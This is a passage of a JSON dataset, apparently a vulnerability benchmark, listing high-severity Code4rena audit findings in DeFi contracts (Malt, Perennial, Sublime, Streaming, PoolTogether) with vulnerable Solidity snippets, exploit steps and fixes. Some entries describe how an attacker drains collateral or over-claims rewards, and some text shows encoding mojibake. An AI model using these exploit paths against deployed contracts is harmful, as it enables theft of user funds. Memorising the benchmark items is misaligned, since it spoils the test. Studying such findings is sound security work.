0.5 * interest.\",\n      \"Attacker makes a profit of 0.5 * interest\"\n    ],\n    \"recommended_mitigation\": [\n      \"Update the tvl when depositing and withdrawing before doing anything else.\"\n    ]\n  },\n  {\n    \"row_number\": 117,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"AuctionBurnReserveSkew.getPegDeltaFrequency() Wrong implementation can result in an improper amount of excess Liquidity Extension balance to be used at the end of an auction\\\"\",\n    \"line\": \"AuctionBurnReserveSkew[116]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-malt#h-04-auctionburnreserveskewgetpegdeltafrequency-wrong-implementation-can-result-in-an-improper-amount-of-excess-liquidity-extension-balance-to-be-used-at-the-end-of-an-auction-\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/AuctionBurnReserveSkew.sol#L116-L132\",\n      \"Whencount < auctionAverageLookback, at L131, it should bereturn total * 10000 / count;. The current implementation will return a smaller value than expected.\",\n      \"The result ofgetPegDeltaFrequency()will be used for calculatingrealBurnBudgetfor auctions. With the result ofgetPegDeltaFrequency()being inaccurate, can result in an improper amount of excess Liquidity Extension balance to be used at the end of an auction.\",\n      \"0xScotch (sponsor) confirmed and disagreed with severity:\",\n      \"Alex the Entreprenerd (judge) commented:\"\n    ],\n    \"code_blocks\": [\n      \"function\\ngetPegDeltaFrequency\\n()\\npublic\\nview\\nreturns\\n(\\nuint256\\n) {\\nuint256\\ninitialIndex\\n=\\n0\\n;\\nuint256\\nindex\\n;\\nif\\n(\\ncount\\n>\\nauctionAverageLookback\\n) {\\ninitialIndex\\n=\\ncount\\n-\\nauctionAverageLookback\\n;\\n}\\nuint256\\ntotal\\n=\\n0\\n;\\nfor\\n(\\nuint256\\ni\\n=\\ninitialIndex\\n;\\ni\\n<\\ncount\\n; ++\\ni\\n) {\\nindex\\n=\\n_getIndexOfObservation\\n(\\ni\\n);\\ntotal\\n=\\ntotal\\n+\\npegObservations\\n[\\nindex\\n];\\n}\\nreturn\\ntotal\\n*\\n10000\\n/\\nauctionAverageLookback\\n;\\n}\"\n    ],\n    \"quotes\": [\n      \"I actually think this should be higher severity. This bug could manifest in liquidity extension being depleted to zero which could have catastrophic consequences downstream.\",\n      \"Agree with the finding, this is an incorrect logic in the protocol, which can limit it‚Äôs functionality and as the sponsor says:could have catastrophic consequences downstreamas such I‚Äôll increase the severity to high.Mitigation seems to be straightforward\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 118,\n    \"bug_id\": \" H-05\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"AuctionEschapeHatch.sol#exitEarly updates state of the auction wrongly\\\"\",\n    \"line\": \"AuctionEscapeHatch[65]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-malt#h-05-auctioneschapehatchsolexitearly-updates-state-of-the-auction-wrongly\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by 0x0x0x\",\n      \"AuctionEschapeHatch.sol#exitEarlytakes as inputamountto represent how much of the\",\n      \"When the user exits an auction with profit, to apply the profit penalty lessmaltQuantityis liquidated compared to how much malt token the liquidated amount corresponds to. The problem isauction.amendAccountParticipation()simply subtracts the malt quantity with penalty and fullamountfrom users auction stats. This causes a major problem, since in_calculateMaltRequiredForExitthose values are used for calculation by calculating maltQuantity as follow:\",\n      \"uint256 maltQuantity = userMaltPurchased.mul(amount).div(userCommitment);\",\n      \"The ratio ofuserMaltPurchased / userCommitmentgets higher after each profit taking (since penalty is applied to substractedmaltQuantityfromuserMaltPurchased), by doing so a user can earn more than it should. Since after each profit taking users commitment corresponds to proportionally more malt, the user can even reduce profit penalties by dividingexitEarlycalls in several calls.\",\n      \"In other words, the ratio ofuserMaltPurchased / userCommitmentgets higher after each profit taking and user can claim more malt with less commitment. Furthermore after alluserMaltPurchasedis claimed the user can haveuserCommitmentleft over, which can be used toclaimArbitrage, when possible.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Make sure which values are used for what and update values which doesn‚Äôt create problems like this. Rethink about how to track values of an auction correctly.\"\n    ]\n  },\n  {\n    \"row_number\": 119,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Wrong shortfall calculation\\\"\",\n    \"line\": \"OptimisticLedger[63]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-perennial#h-01-wrong-shortfall-calculation\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by kenzo\",\n      \"Every time an account is settled, if shortfall is created, due to a wrong calculation shortfall will double in size and add the new shortfall.\",\n      \"Loss of funds: users won‚Äôt be able to withdraw the correct amount of funds. Somebody would have to donate funds to resolve the wrong shortfall.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"We can see in thesettleAccountofOptimisticLedgerthatself.shortfallends up beingself.shortfall+self.shortfall+newShortfall:(Code ref)\",\n      \"function\\nsettleAccount\\n(\\nOptimisticLedger\\nstorage\\nself\\n,\\naddress\\naccount\\n,\\nFixed18\\namount\\n)\\ninternal\\nreturns\\n(\\nUFixed18\\nshortfall\\n) {\\nFixed18\\nnewBalance\\n=\\nFixed18Lib\\n.\\nfrom\\n(\\nself\\n.\\nbalances\\n[\\naccount\\n]).\\nadd\\n(\\namount\\n);\\nif\\n(\\nnewBalance\\n.\\nsign\\n() == -\\n1\\n) {\\nshortfall\\n=\\nself\\n.\\nshortfall\\n.\\nadd\\n(\\nnewBalance\\n.\\nabs\\n());\\nnewBalance\\n=\\nFixed18Lib\\n.\\nZERO\\n;\\n}\\nself\\n.\\nbalances\\n[\\naccount\\n] =\\nnewBalance\\n.\\nabs\\n();\\nself\\n.\\nshortfall\\n=\\nself\\n.\\nshortfall\\n.\\nadd\\n(\\nshortfall\\n);\\n}\",\n      \"Additionally, you can add the following line to the ‚Äúshortfall reverts if depleted‚Äù test inCollateral.test.js, line 190:\",\n      \"await\\ncollateral\\n.\\nconnect\\n(\\nproductSigner\\n).\\nsettleAccount\\n(\\nuserB\\n.\\naddress\\n, -\\n50\\n)\",\n      \"Previously the test product had 50 shortfall. Now we added 50 more, but the test will print that the actual shortfall is 150, and not 100 as it should be.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Move the setting ofself.shortfallto inside the if function and change the line to:\",\n      \"self.shortfall = shortfall\",\n      \"kbrizzle (Perennial) confirmed:\",\n      \"Excellent find üôè\",\n      \"Alex the Entreprenerd (judge) commented:\",\n      \"Agree with the findingshortfall = self.shortfall.add(newBalance.abs());is already shortfal + newBalance.abs()\\nSo performing line73self.shortfall = self.shortfall.add(shortfall);is addingshortfallagain\"\n    ]\n  },\n  {\n    \"row_number\": 121,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-2\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Wrong returns of SavingsAccountUtil.depositFromSavingsAccount() can cause fund loss\\\"\",\n    \"line\": \"Pool[207,225],SavingsAccountUtil[11,66]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-sublime#h-02-wrong-returns-of-savingsaccountutildepositfromsavingsaccount-can-cause-fund-loss\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"The functionSavingsAccountUtil.depositFromSavingsAccount()is expected to return the number of equivalent shares for given_asset.\",\n      \"https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L225-L267\",\n      \"However, sincesavingsAccountTransfer()does not return the result of_savingsAccount.transfer(), but returned_amountinstead, which means thatSavingsAccountUtil.depositFromSavingsAccount()may not return the actual shares (when pps is not 1).\",\n      \"https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/SavingsAccount/SavingsAccountUtil.sol#L11-L26\",\n      \"https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/SavingsAccount/SavingsAccountUtil.sol#L66-L80\",\n      \"As a result, the recorded_sharesReceivedcan be wrong.\",\n      \"https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L207-L223\",\n      \"Given:\",\n      \"the price per share of yearn USDC vault is1.2\",\n      \"Alice deposited12,000 USDCtoyearnstrategy, received10,000share tokens;\",\n      \"Alice created a pool, and added all the12,000 USDCfrom the saving account as collateral; The recordedCollateralAddedgot the wrong number:12000which should be10000;\",\n      \"Alice failed to borrow money with the pool and tries tocancelPool(), it fails as the recorded collateralsharesare more than the actual collateral.\",\n      \"As a result, Alice has lost all the12,000 USDC.\",\n      \"If Alice managed to borrow with the pool, when the loan defaults, the liquidation will also fail, and cause fund loss to the lenders.\",\n      \"Change to:\",\n      \"ritik99 (Sublime) confirmed\"\n    ],\n    \"code_blocks\": [\n      \"/**\\n*\\n@notice\\ninternal function used to get amount of collateral deposited to the pool\\n*\\n@param\\n_fromSavingsAccount\\nif true, collateral is transferred from _sender's savings account, if false, it is transferred from _sender's wallet\\n*\\n@param\\n_toSavingsAccount\\nif true, collateral is transferred to pool's savings account, if false, it is withdrawn from _sender's savings account\\n*\\n@param\\n_asset\\naddress of the asset to be deposited\\n*\\n@param\\n_amount\\namount of tokens to be deposited in the pool\\n*\\n@param\\n_poolSavingsStrategy\\naddress of the saving strategy used for collateral deposit\\n*\\n@param\\n_depositFrom\\naddress which makes the deposit\\n*\\n@param\\n_depositTo\\naddress to which the tokens are deposited\\n*\\n@return\\n_sharesReceived number of equivalent shares for given _asset\\n*/\\nfunction\\n_deposit\\n(\\nbool\\n_fromSavingsAccount\\n,\\nbool\\n_toSavingsAccount\\n,\\naddress\\n_asset\\n,\\nuint256\\n_amount\\n,\\naddress\\n_poolSavingsStrategy\\n,\\naddress\\n_depositFrom\\n,\\naddress\\n_depositTo\\n)\\ninternal\\nreturns\\n(\\nuint256\\n_sharesReceived\\n) {\\nif\\n(\\n_fromSavingsAccount\\n) {\\n_sharesReceived\\n=\\nSavingsAccountUtil\\n.\\ndepositFromSavingsAccount\\n(\\nISavingsAccount\\n(\\nIPoolFactory\\n(\\npoolFactory\\n).\\nsavingsAccount\\n()),\\n_depositFrom\\n,\\n_depositTo\\n,\\n_amount\\n,\\n_asset\\n,\\n_poolSavingsStrategy\\n,\\ntrue\\n,\\n_toSavingsAccount\\n);\\n}\\nelse\\n{\\n_sharesReceived\\n=\\nSavingsAccountUtil\\n.\\ndirectDeposit\\n(\\nISavingsAccount\\n(\\nIPoolFactory\\n(\\npoolFactory\\n).\\nsavingsAccount\\n()),\\n_depositFrom\\n,\\n_depositTo\\n,\\n_amount\\n,\\n_asset\\n,\\n_toSavingsAccount\\n,\\n_poolSavingsStrategy\\n);\\n}\\n}\",\n      \"function\\ndepositFromSavingsAccount\\n(\\nISavingsAccount\\n_savingsAccount\\n,\\naddress\\n_from\\n,\\naddress\\n_to\\n,\\nuint256\\n_amount\\n,\\naddress\\n_token\\n,\\naddress\\n_strategy\\n,\\nbool\\n_withdrawShares\\n,\\nbool\\n_toSavingsAccount\\n)\\ninternal\\nreturns\\n(\\nuint256\\n) {\\nif\\n(\\n_toSavingsAccount\\n) {\\nreturn\\nsavingsAccountTransfer\\n(\\n_savingsAccount\\n,\\n_from\\n,\\n_to\\n,\\n_amount\\n,\\n_token\\n,\\n_strategy\\n);\\n}\\nelse\\n{\\nreturn\\nwithdrawFromSavingsAccount\\n(\\n_savingsAccount\\n,\\n_from\\n,\\n_to\\n,\\n_amount\\n,\\n_token\\n,\\n_strategy\\n,\\n_withdrawShares\\n);\\n}\\n}\",\n      \"function\\nsavingsAccountTransfer\\n(\\nISavingsAccount\\n_savingsAccount\\n,\\naddress\\n_from\\n,\\naddress\\n_to\\n,\\nuint256\\n_amount\\n,\\naddress\\n_token\\n,\\naddress\\n_strategy\\n)\\ninternal\\nreturns\\n(\\nuint256\\n) {\\nif\\n(\\n_from\\n==\\naddress\\n(\\nthis\\n)) {\\n_savingsAccount\\n.\\ntransfer\\n(\\n_amount\\n,\\n_token\\n,\\n_strategy\\n,\\n_to\\n);\\n}\\nelse\\n{\\n_savingsAccount\\n.\\ntransferFrom\\n(\\n_amount\\n,\\n_token\\n,\\n_strategy\\n,\\n_from\\n,\\n_to\\n);\\n}\\nreturn\\n_amount\\n;\\n}\",\n      \"function\\n_depositCollateral\\n(\\naddress\\n_depositor\\n,\\nuint256\\n_amount\\n,\\nbool\\n_transferFromSavingsAccount\\n)\\ninternal\\nnonReentrant\\n{\\nuint256\\n_sharesReceived\\n=\\n_deposit\\n(\\n_transferFromSavingsAccount\\n,\\ntrue\\n,\\npoolConstants\\n.\\ncollateralAsset\\n,\\n_amount\\n,\\npoolConstants\\n.\\npoolSavingsStrategy\\n,\\n_depositor\\n,\\naddress\\n(\\nthis\\n)\\n);\\npoolVariables\\n.\\nbaseLiquidityShares\\n=\\npoolVariables\\n.\\nbaseLiquidityShares\\n.\\nadd\\n(\\n_sharesReceived\\n);\\nemit\\nCollateralAdded\\n(\\n_depositor\\n,\\n_amount\\n,\\n_sharesReceived\\n);\\n}\",\n      \"function\\nsavingsAccountTransfer\\n(\\nISavingsAccount\\n_savingsAccount\\n,\\naddress\\n_from\\n,\\naddress\\n_to\\n,\\nuint256\\n_amount\\n,\\naddress\\n_token\\n,\\naddress\\n_strategy\\n)\\ninternal\\nreturns\\n(\\nuint256\\n) {\\nif\\n(\\n_from\\n==\\naddress\\n(\\nthis\\n)) {\\nreturn\\n_savingsAccount\\n.\\ntransfer\\n(\\n_amount\\n,\\n_token\\n,\\n_strategy\\n,\\n_to\\n);\\n}\\nelse\\n{\\nreturn\\n_savingsAccount\\n.\\ntransferFrom\\n(\\n_amount\\n,\\n_token\\n,\\n_strategy\\n,\\n_from\\n,\\n_to\\n);\\n}\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 122,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Yearn token <> shares conversion decimal issue\\\"\",\n    \"line\": \"YearnYield[178]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-sublime#h-04-yearn-token--shares-conversion-decimal-issue\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"The yearn strategyYearnYieldconverts shares to tokens by doingpricePerFullShare * shares / 1e18:\",\n      \"But Yearn‚ÄôsgetPricePerFullShareseems to beinvault.decimals()precision, i.e., it should convert it aspricePerFullShare * shares / (10 ** vault.decimals()).\\nThe vault decimals are the sameas the underlying token decimals\",\n      \"The token and shares conversions do not work correctly for underlying tokens that do not have 18 decimals.\\nToo much or too little might be paid out leading to a loss for either the protocol or user.\"\n    ],\n    \"code_blocks\": [\n      \"function getTokensForShares(uint256 shares, address asset) public view override returns (uint256 amount) {\\nif (shares == 0) return 0;\\n// @audit should divided by vaultDecimals\\namount = IyVault(liquidityToken[asset]).getPricePerFullShare().mul(shares).div(1e18);\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Divide by10**vault.decimals()instead of1e18ingetTokensForShares.\\nApply a similar fix ingetSharesForTokens.\",\n      \"ritik99 (Sublime) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 123,\n    \"bug_id\": \" H-06\",\n    \"bug_label\": \" S5-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Anyone can liquidate credit line when autoLiquidation is false without supplying borrow tokens\\\"\",\n    \"line\": \"CreditLine[996,1013]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-sublime#h-06-anyone-can-liquidate-credit-line-when-autoliquidation-is-false-without-supplying-borrow-tokens\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by harleythedog\",\n      \"It is intended that if a credit line has autoLiquidation as false, then only the lender can be the liquidator (see docs here:https://docs.sublime.finance/sublime-docs/smart-contracts/creditlines). However, this is not correctly implemented, and anyone can liquidate a position that has autoLiquidation set to false.\",\n      \"Even worse, when autoLiquidation is set to false, the liquidator does not have to supply the initial amount of borrow tokens (determined by_borrowTokensToLiquidate) that normally have to be transferred when autoLiquidation is true. This means that the liquidator will be sent all of the collateral that is supposed to be sent to the lender, so this represents a huge loss to the lender. Since the lender will lose all of the collateral that they are owed, this is a high severity issue.\",\n      \"Inspection and confirmed with Hardhat.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"The current implementation of liquidate is here:https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L996.\",\n      \"Notice that the autoLiquidation value is only used in one place within this function, which is in this segment of the code:\",\n      \"...\\nif\\n(\\ncreditLineConstants\\n[\\n_id\\n].\\nautoLiquidation\\n&&\\n_lender\\n!=\\nmsg\\n.\\nsender\\n) {\\nuint256\\n_borrowTokens\\n=\\n_borrowTokensToLiquidate\\n(\\n_borrowAsset\\n,\\n_collateralAsset\\n,\\n_totalCollateralTokens\\n);\\nif\\n(\\n_borrowAsset\\n==\\naddress\\n(\\n0\\n)) {\\nuint256\\n_returnETH\\n=\\nmsg\\n.\\nvalue\\n.\\nsub\\n(\\n_borrowTokens\\n,\\n'Insufficient ETH to liquidate'\\n);\\nif\\n(\\n_returnETH\\n!=\\n0\\n) {\\n(\\nbool\\nsuccess\\n, ) =\\nmsg\\n.\\nsender\\n.\\ncall\\n{value:\\n_returnETH\\n}(\\n''\\n);\\nrequire\\n(\\nsuccess\\n,\\n'Transfer fail'\\n);\\n}\\n}\\nelse\\n{\\nIERC20\\n(\\n_borrowAsset\\n).\\nsafeTransferFrom\\n(\\nmsg\\n.\\nsender\\n,\\n_lender\\n,\\n_borrowTokens\\n);\\n}\\n}\\n_transferCollateral\\n(\\n_id\\n,\\n_collateralAsset\\n,\\n_totalCollateralTokens\\n,\\n_toSavingsAccount\\n);\\nemit\\nCreditLineLiquidated\\n(\\n_id\\n,\\nmsg\\n.\\nsender\\n);\\n}\",\n      \"So, ifautoLiquidationis false, the code inside of the if statement will simply not be executed, and there are no further checks that the sender HAS to be the lender ifautoLiquidationis false. This means that anyone can liquidate a non-autoLiquidation credit line, and receive all of the collateral without first transferring the necessary borrow tokens.\",\n      \"For a further proof of concept, consider the test file here:https://github.com/code-423n4/2021-12-sublime/blob/main/test/CreditLines/2.spec.ts. If the code on line 238 is changed fromlet _autoLiquidation: boolean = true;tolet _autoLiquidation: boolean = false;, all the test cases will still pass. This confirms the issue, as the final test case ‚ÄúLiquidate credit line‚Äù has theadminas the liquidator, which should not work in non-autoLiquidations since they are not the lender.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Add the following require statement somewhere in theliquidatefunction:\",\n      \"require\\n(\\ncreditLineConstants\\n[\\n_id\\n].\\nautoLiquidation\\n||\\nmsg\\n.\\nsender\\n==\\ncreditLineConstants\\n[\\n_id\\n].\\nlender\\n,\\n\\\"not autoLiquidation and not lender\\\"\\n);\"\n    ]\n  },\n  {\n    \"row_number\": 125,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 5,\n    \"bug_description\": \" \\\"Reward token not correctly recovered\\\"\",\n    \"line\": \"Locke[646]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-streaming#h-03-reward-token-not-correctly-recovered\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by GeekyLumberjack, kenzo, pedroais, and hyh\",\n      \"TheStreamingcontract allows recovering the reward token by callingrecoverTokens(rewardToken, recipient).\",\n      \"However, the excess amount is computed incorrectly asERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount):\",\n      \"Note thatrewardTokenAmountonly everincreases(when callingfundStream) but it never decreases when claiming the rewards throughclaimReward.\\nHowever,claimRewardtransfers out the reward token.\",\n      \"Therefore, therewardTokenAmountnever tracks the contract‚Äôs reward balance and the excess cannot be computed that way.\",\n      \"Reward token recovery does not work.\"\n    ],\n    \"code_blocks\": [\n      \"function\\nrecoverTokens\\n(\\naddress\\ntoken\\n,\\naddress\\nrecipient\\n)\\npublic\\nlock\\n{\\nif\\n(\\ntoken\\n==\\nrewardToken\\n) {\\nrequire\\n(\\nblock\\n.\\ntimestamp\\n>\\nendRewardLock\\n,\\n\\\"time\\\"\\n);\\n// check what isnt claimable by depositors and governance\\n// @audit-issue rewardTokenAmount increased on fundStream, but never decreased! this excess underflows\\nuint256\\nexcess\\n=\\nERC20\\n(\\ntoken\\n).\\nbalanceOf\\n(\\naddress\\n(\\nthis\\n)) - (\\nrewardTokenAmount\\n+\\nrewardTokenFeeAmount\\n);\\nERC20\\n(\\ntoken\\n).\\nsafeTransfer\\n(\\nrecipient\\n,\\nexcess\\n);\\nemit\\nRecoveredTokens\\n(\\ntoken\\n,\\nrecipient\\n,\\nexcess\\n);\\nreturn\\n;\\n}\\n// ...\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Assume no reward fees for simplicity and only a single user staking.\",\n      \"Someone funds1000reward tokens throughfundStream(1000). ThenrewardTokenAmount = 1000The stream and reward lock period is over, i.e.block.timestamp > endRewardLockThe user claims their full reward and receives1000reward tokens by callingclaimReward(). The reward contract balance is now0butrewardTokenAmount = 1000Some fool sends 1000 reward tokens to the contract by accident. These cannot be recovered as theexcess = balance - rewardTokenAmount = 0\"\n    ],\n    \"recommended_mitigation\": [\n      \"The claimed rewards need to be tracked as well, just like the claimed deposits are tracked.\\nI think you can even decreaserewardTokenAmountinclaimRewardbecause at this pointrewardTokenAmountis not used to update thecumulativeRewardPerTokenanymore.\",\n      \"brockelmore (Streaming Protocol) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 126,\n    \"bug_id\": \" H-08\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"ts.tokens sometimes calculated incorrectly\\\"\",\n    \"line\": \"Locke[203,417,455]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-streaming#h-08-tstokens-sometimes-calculated-incorrectly\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by gpersoon, also found by WatchPug\",\n      \"Suppose someone stakes some tokens and then withdraws all of his tokens (he can still withdraw). This will result in ts.tokens being 0.\",\n      \"Now after some time he stakes some tokens again.\\nAt the second stakeupdateStream()is called and the following if condition is false becausets.tokens==0\",\n      \"Thusts.lastUpdateis not updated and stays at the value from the first withdraw.\\nNow he does a second withdraw.updateStream()is called an calculates the updated value ofts.tokens.\\nHowever it usests.lastUpdate, which is the time from the first withdraw and not from the second stake. So the value ofts.tokenis calculated incorrectly.\\nThus more tokens can be withdrawn than you are supposed to be able to withdraw.\"\n    ],\n    \"code_blocks\": [\"if\\n(\\nacctTimeDelta\\n>\\n0\\n&&\\nts\\n.\\ntokens\\n>\\n0\\n) {\"],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L417-L447\",\n      \"function\\nstake\\n(\\nuint112\\namount\\n)\\npublic\\nlock\\nupdateStream\\n(msg.sender) {\\n...\\nuint112\\ntrueDepositAmt\\n=\\nuint112\\n(\\nnewBal\\n-\\nprevBal\\n);\\n...\\nts\\n.\\ntokens\\n+=\\ntrueDepositAmt\\n;\",\n      \"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L455-L479\",\n      \"function\\nwithdraw\\n(\\nuint112\\namount\\n)\\npublic\\nlock\\nupdateStream\\n(msg.sender) {\\n...\\nts\\n.\\ntokens\\n-=\\namount\\n;\",\n      \"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L203-L250\",\n      \"function\\nupdateStreamInternal\\n(\\naddress\\nwho\\n)\\ninternal\\n{\\n...\\nuint32\\nacctTimeDelta\\n=\\nuint32\\n(\\nblock\\n.\\ntimestamp\\n) -\\nts\\n.\\nlastUpdate\\n;\\nif\\n(\\nacctTimeDelta\\n>\\n0\\n&&\\nts\\n.\\ntokens\\n>\\n0\\n) {\\n// some time has passed since this user last interacted\\n// update ts not yet streamed\\nts\\n.\\ntokens\\n-=\\nuint112\\n(\\nacctTimeDelta\\n*\\nts\\n.\\ntokens\\n/ (\\nendStream\\n-\\nts\\n.\\nlastUpdate\\n));\\nts\\n.\\nlastUpdate\\n=\\nuint32\\n(\\nblock\\n.\\ntimestamp\\n);\\n}\"\n    ],\n    \"recommended_mitigation\": [\n      \"Change the code in updateStream()  to:\",\n      \"if\\n(\\nacctTimeDelta\\n>\\n0\\n) {\\n// some time has passed since this user last interacted\\n// update ts not yet streamed\\nif\\n(\\nts\\n.\\ntokens\\n>\\n0\\n)\\nts\\n.\\ntokens\\n-=\\nuint112\\n(\\nacctTimeDelta\\n*\\nts\\n.\\ntokens\\n/ (\\nendStream\\n-\\nts\\n.\\nlastUpdate\\n));\\nts\\n.\\nlastUpdate\\n=\\nuint32\\n(\\nblock\\n.\\ntimestamp\\n);\\n// always update ts.lastUpdate (if time has elapsed)\\n}\",\n      \"Note: the next if statement with unstreamed and lastUpdate can be changed in a similar way to save some gas\",\n      \"brockelmore (Streaming Protocol) confirmed:\",\n      \"Nice catch :)\"\n    ]\n  },\n  {\n    \"row_number\": 127,\n    \"bug_id\": \" H-10\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 5,\n    \"bug_description\": \" \\\"recoverTokens doesnÈà•Ê™õ work when isSale is true\\\"\",\n    \"line\": \"Locke[583,654]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-streaming#h-10-recovertokens-doesnt-work-when-issale-is-true\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by harleythedog, also found by kenzo, pedroais, hyh, and pauliax\",\n      \"InrecoverTokens, the logic to calculate the excess number of deposit tokens in the contract is:\",\n      \"This breaks in the case where isSale is true and the deposit tokens have already been claimed through the use ofcreatorClaimSoldTokens. In this case,redemeedDepositTokenswill be zero, anddepositTokenAmountwill still be at its original value when the streaming ended. As a result, any attempts to recover deposit tokens from the contract would either revert or send less tokens than should be sent, since the logic above would still think that there are the full amount of deposit tokens in the contract. This breaks the functionality of the function completely in this case.\"\n    ],\n    \"code_blocks\": [\n      \"uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Seestakehere:https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L417\",\n      \"Seewithdrawhere:https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L455\",\n      \"Notice thatstakeincrementsunstreamedbutwithdrawdoes not affectunstreamedat all, even thoughwithdrawis indeed removing unstreamed deposit tokens from the contract.\"\n    ],\n    \"recommended_mitigation\": [\n      \"I would recommend setting redeemedDepositTokens to be depositTokenAmount in the function creatorClaimSoldTokens, since claiming the sold tokens is like ‚Äúredeeming‚Äù them in a sense. This would fix the logic issue in recoverTokens.\"\n    ]\n  },\n  {\n    \"row_number\": 128,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S5-2\",\n    \"difficulty\": 6,\n    \"bug_description\": \" \\\"Continue claiming reqrds after numberOfEpochs are over\\\"\",\n    \"line\": \"TwabRewards[118,238,269,357,388,412,453,475,496]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-pooltogether#h-03-continue-claiming-reqrds-after-numberofepochs-are-over\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by gpersoon, also found by 0xabc, csanuragjain, harleythedog, kenzo, and leastwood\",\n      \"When claiming rewards viaclaimRewards(), the function\\\\_calculateRewardAmount()is called.\\nThe function\\\\_calculateRewardAmount()has a check to make sure the epoch is over\",\n      \"However neither functions check if the\\\\_epochIdis within the range of the reward epochs.\\nErgo it is possible to continue claiming rewards after the reward period is over.\\nThis only works as long as there are enough tokens in the contract. But this is the case when not everyone has claimed, or other rewards use the same token.\",\n      \"The proof of concept contains a simplified version of the contract, and shows how this can be done.\\nWhen run in remix you get the following output, while there is only 1 epoch.console.log: Claiming for epoch 1 1 Claiming for epoch 2 1 Claiming for epoch 3 1 Claiming for epoch 4 1 Claiming for epoch 5 1\"\n    ],\n    \"code_blocks\": [\n      \"require\\n(\\nblock\\n.\\ntimestamp\\n>\\n_epochEndTimestamp\\n,\\n\\\"TwabRewards/epoch-not-over\\\"\\n);\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"// SPDX-License-Identifier: 